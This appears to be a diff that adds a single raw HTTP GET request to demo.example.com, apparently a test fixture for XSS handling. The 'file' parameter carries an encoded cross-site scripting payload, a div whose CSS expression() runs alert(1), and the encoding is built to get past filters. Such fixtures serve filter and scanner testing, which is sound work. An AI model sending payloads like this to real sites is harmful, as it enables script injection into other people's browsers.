@@ -1,0 +1,4 @@
+GET /a?file=%26%23x3C;div%20style%3D%26%23x22;width:expression(alert(1))%26%23x22;%26%23x3E; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
